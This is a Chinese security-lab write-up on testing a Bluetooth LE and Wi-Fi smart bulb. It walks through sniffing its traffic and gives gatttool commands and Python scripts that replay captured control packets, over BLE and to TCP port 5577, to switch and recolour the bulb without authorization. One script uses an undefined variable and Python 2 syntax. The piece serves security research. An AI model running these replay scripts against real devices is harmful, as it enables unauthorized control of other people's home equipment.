---
title: 家用智能灯泡的控制功能安全测试
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247497263&idx=1&sn=7cd7b78de1b751434da43238495511c4&chksm=fa522391cd25aa877c1e8889e70678755c6dc68791b2f561dba71f7d8e2d7270576d307b07d0&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2022-11-03
fetch_date: 2025-10-03T21:40:21.010312
---

# 家用智能灯泡的控制功能安全测试

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedYKrRSOpzagtaFoLqgStfhhJdBQiaYMPyMRHxTGUruyFIG4wHy2b6Oibg/0?wx_fmt=jpeg)

# 家用智能灯泡的控制功能安全测试

原创

智能安全实验室

山石网科安全技术研究院

**前言**

随着IOT技术的普及，智能家居设备在家庭中使用的也越来越多，例如智能灯泡、扫地机器人、智能音箱等智能设备都可以由一些专门的app进行统一的联网接管管理。本篇文章将以一款基于低功耗蓝牙的智能灯泡为例，展示其中可能存在的一些网络安全风险问题以及一些常规的劫持攻击方法。

**实验准备**

**-所需工具**

硬件工具：

NRF52832 Dongle

CSR8510蓝牙适配器

软件工具：

wireshark

gatttool

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedib1FlqC9PwJLrjWTjibVtMsQAAeXibrHWbA2F2k6eiculhQRlBdeWDWHibQ/640?wx_fmt=png)

-**BLE****监听环境**

cp2102驱动下载：

https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers

Whireshark插件nrf sniffer：

https://www.nordicsemi.com/Software-and-Tools/Development-Tools/nRF-Sniffer/Download#infotab

1. 1. 在wireshark中打开“关于”->"文件夹"->"Global Extcap path"将下载的nrf sniffer中的extcap中的文件复制于此。
2. ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedVMrlVMXDmjY5jPcicnXTBvoJkVxKr0c8MYE09NkZ2KOCmI13Dj2bU8Q/640?wx_fmt=png)
3. 2. 将Profile\_nRF\_Sniffer\_Bluetooth\_LE文件夹拷贝到profiles文件夹中，
4. ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedeKfPRK65L67w3GQL3wjC17iayprolJPZfh5v7NeXPoC3aYFic4TaKLOg/640?wx_fmt=png)
5. 随后在“配置文件”中设置新增的nRF\_Sniffer配置文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedDStVAebBy2iaVEWMgAiaqXnIxZUNiahp7uvLXmzhNJhZ3TvO2wuyuOpZg/640?wx_fmt=png)3. Python安装pyserial库

pip install pyserial>=3.4

https://files.pythonhosted.org/packages/1e/7d/ae3f0a63f41e4d2f6cb66a5b57197850f919f59e558159a4dd3a818f5082/pyserial-3.5.tar.gz

1. 4.  最后可以再接口中看到nRF Sniffer的设备即完成wireshark的准备。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPed0pictHKHYtticsPawr6XhH5HUbJCbbIBfGWPsayBWCmQyhcNDibficBJRg/640?wx_fmt=png)

**BLE数据包分析**

1. 1.  接入NRF52832 Dongle后在上方Device中选择要监听的目标设备（需要BLE设备处于活动状态），再对蓝牙主从机建立连接，之后就可以在CONNECT\_IND包中看到相对应的通信信道所使用的情况，以及Bluetooth Attribute Protocol中可以看到通信的关键部分，如Opcode（具体的读写操作）、Handle（Characteristic，属性地址）、Value（数据值）。而本次分析的重点也在于Bluetooth Attribute Protocol协议层的会话传递过程。
2. ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedtGVYhLW1wMSK4EibMj9ZW3ObrgcUDXLq5sarCqw54Ku77XhO84m69Hw/640?wx_fmt=png)

2. 在ble设备与主机建立连接后便可以看到大量的数据包，会对需要重点关注的BLE相关会话分析造成很大影响，对此可以使用!(btle.length==0)来过滤掉所有的空包，btatt显示所有的att数据包。

3.在使用过滤指令后，尝试通过手机控制灯泡的开关，这时在Wireshark中就可以看到一些ATT的数据包，在为加密的情况下，可以直观的看到相关信息中写着“Sent Write Command…”。

4.而这些数据包的Bluetooth Attribute Protocol中Opcode代表着具体的执行操作，可以是write（cmd、req）、read（cmd、req）等操作。handle为写入的地址属性标识，也代表着控制蓝牙灯泡时的主要需要操作的指令，如灯泡开关、颜色、亮度等。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedovYjStlVObCWuYQzrE8zmvqbNfh7TtVot7jBpHlm1KR7LG6wvCkV7w/640?wx_fmt=png)

2. 5.  通过多次发送开关请求分析可以发现在其中对应的handle：0x0011的value分别为下：

**000180000003040a715495****开启灯光**

**000180000003040a712495****关闭灯光**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedagWib2x4jjyDbHVDeqOiaHUQFFPg8Xh4k2sANcIQ54sPSNAuSBRpETUQ/640?wx_fmt=png)

2. 6.  在得到这样的数值并且知道其属于service 0xffff的句柄ID为0x0011后，便可以尝试对其句柄value进行写入操作，进行数据请求的重放，从而实现未授权的远程控制灯泡开关操作。这里使用gatttool工具对其进行写入测试。

-通过primary查看相关的句柄属性。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedicBoS7yTEZoj8DEdcbcSnd9iaWjJeFn3LhBeP3SN00psSWFP0IicFmwrQ/640?wx_fmt=png)

-使用char-write-cmd 就可以直接向0x0011中写入数据。

```
> gatttool -b b4:e8:42:54:ba:ab -I
[b4:e8:42:54:ba:ab][LE]> connect
[b4:e8:42:54:ba:ab][LE]> char-write-cmd 0x0011 000180000003040a712495
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedAA8Iicoak6w1zZsQ6bpI6FsktpYnTBpkMYA21n6jLyaFoGHQ6vIUz4A/640?wx_fmt=png)

7.并可以将过程编写为python脚本如下

```
 #!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
#context.log_level = "debug"
argv = ["gatttool","-b","b4:e8:42:54:ba:ab","-I"]
sh = process(argv)
sh.sendline("connect")
sh.recvuntil("Connection successful")
sh.recvuntil("[LE]> ")
#value = "000180000003040a712495" #off
#value = "000380000003040a712394" #on
sh.sendline("char-write-cmd 0x0011 000180000000010c")
sh.sendline("char-write-cmd 0x0011 00048000000e0f0ae00100a11e646400000000140000")
#sh.sendline("char-write-cmd 0x0011 "+sys.argv[1])
#for i in range(90):
#    sh.sendline("char-write-cmd 0x0011 000180000003040a712495")
#    sleep(2)
#    sh.sendline("char-write-cmd 0x0011 000380000003040a712394")
sh.interactive()
```

也可以使用python的bluepy库进行编写

```
from bluepy.btle import *
import time
def hackFlow(conn, address):
    conn.waitForNotifications(2)
    conn.writeCharacteristic(0x0004, "\x00\x04", True)
    conn.writeCharacteristic(0x000f,"\x00\x01",True)
    conn.waitForNotifications(2)
    conn.writeCharacteristic(0x0011,"\x00\x01\x80\x00\x00\x02\x03\x01\x22\x22",True)

if __name__ == '__main__':

    devAddr = "b4:e8:42:54:ba:ab"
    addrType = ADDR_TYPE_PUBLIC
    time.sleep(1)
    conn = Peripheral(devAddr, addrType)
    try:
        hackFlow(conn,devAddr)
        print("vibering...")
    finally:
        print("disconnect...")
        conn.disconnect()
```

**TCP 数据包分析**

由于该智能灯泡同时支持wifi接入，因此除了对BLE的分析外，还可以尝试分析其TCP协议上的会话过程。

同样是通过wireshark进行抓包分析，在手机端接入PC的网络后，使用**eth.src == 14:7d:da:5b:xx:xx && eth.dst ==b4:e8:42:54:ba:aa**进行过滤。

当使用手机开启灯光时可以直观的看到一条想5577端口请求的数据包，其中的data值为**b0b1b2b30001022f000371239423**。 那么对应的这个值便是控制灯光开启的参数了。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedRs5XJgNBfE5xZq7crZb2P5sgHWpd71YXVicwQNqr5jSrp6EGu569KrA/640?wx_fmt=png)

使用同样的方法测试APP中的其他功能，例如控制变换其他颜色，抓取到的对应值如下：

```
on = "b0b1b2b30001022f000371239423" # on
off = "b0b1b2b30001024500037124953b"
red = "b0b1b2b300010241000ee00100a10064640000000014000076" # red
blue = "b0b1b2b30001024a000ee00100a178646400000000140000f7"
green = "b0b1b2b30001024c000ee00100a13c646400000000140000bd"
```

最后编写Python脚本，就可以实现同一局域网下的未授权控制，控制灯光任意颜色或者开关。

```
from pwn import *
context.log_level = "debug"
sh= remote("192.168.31.177",5577)
on = "b0b1b2b30001022f000371239423" # on
off = "b0b1b2b30001024500037124953b"
red = "b0b1b2b300010241000ee00100a10064640000000014000076" # red
blue = "b0b1b2b30001024a000ee00100a178646400000000140000f7"
green = "b0b1b2b30001024c000ee00100a13c646400000000140000bd"
payload = test.decode('hex')
# payload = "\xb0\xb1\xb2\xb3\x00\x01\x02\x1e\x00\x03\x71\x23\x94\x12"
sh.send(payload)
sh.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPed1OOPZIHz7N6w4EWCZQRyyQlI69mS72ChicktWH9CkXfagoCM7pZ4icoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTB2obibAxgst9jHULvmIPedGC8fPPibCoco5HomSiafA4pd5dDkhuicOJgpuqzjLXhchjQXcSIUmNiaGA/640?wx_fmt=png)

**END**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

山石网科安全技术研究院

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过